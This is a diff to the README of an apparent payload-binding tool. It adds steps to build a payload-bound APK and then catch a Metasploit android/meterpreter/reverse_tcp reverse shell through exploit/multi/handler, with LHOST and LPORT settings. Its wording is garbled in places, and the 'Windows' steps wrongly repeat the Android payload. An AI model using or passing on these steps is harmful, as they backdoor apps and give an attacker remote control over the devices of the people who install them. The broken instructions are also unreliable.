@@ -13,4 +13,19 @@ git clone https://github.com/Adia12528/Payload_binding-tool.git
 
 cd Payload_binding-tool
 
-python payload-maker-tool.py
+python payload_maker_tool.py
+
+After the app is being.
+Your apk is saved in your internal storage downloads.
+And not you can use msfconsole exploit:
+
+use exploit/multi/handler
+
+use android/meterpreter/reverse_tcp 
+
+Or for windows;
+
+use android/meterpreter/reverse_tcp 
+set LHOST "your ip"
+set LPORT "used port in payload"
+exploit
